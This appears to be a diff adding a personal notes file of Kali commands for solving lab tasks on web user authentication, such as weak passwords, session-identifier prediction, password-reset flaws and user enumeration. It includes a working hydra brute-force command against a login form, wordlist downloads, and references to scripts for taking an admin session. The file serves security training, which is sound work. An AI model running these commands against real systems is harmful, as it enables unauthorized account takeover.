@@ -1,0 +1,26 @@
+﻿Kali commands useful for completing tasks from BSI:
+TOPIC: [Web] User authentication
+
+task_1: Low-complexity user password
+(downloading the contents may be helpful for scripting)
+wget https://raw.githubusercontent.com/USER/REPO/BRANCH/path/to/file.txt
+(e.g. wget https://raw.githubusercontent.com/CyberSkiller/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt)
+hydra IP -s 80 -l admin -P 10k-most-common.txt -t 64 -T 64 http-post-form '/:username=^USER^&password=^PASS^&submit=Submit:failed'
+
+task_2: Weak randomness session identifier
+DONE USING GUI
+(python script in the repo)
+python3 get_admin_sessid.py ip_address
+
+task_3: Client-side authentication
+DONE USING GUI
+
+task_4: Incorrect password reset implementation
+DONE USING GUI
+(python script in the repo)
+python get_admin_id.py ip_address
+
+task_5: User enumeration based on response time
+(downloading the contents may be helpful for scripting)
+wget https://raw.githubusercontent.com/CyberSkiller/SecLists/master/Usernames/cirt-default-usernames.txt
+DONE USING GUI
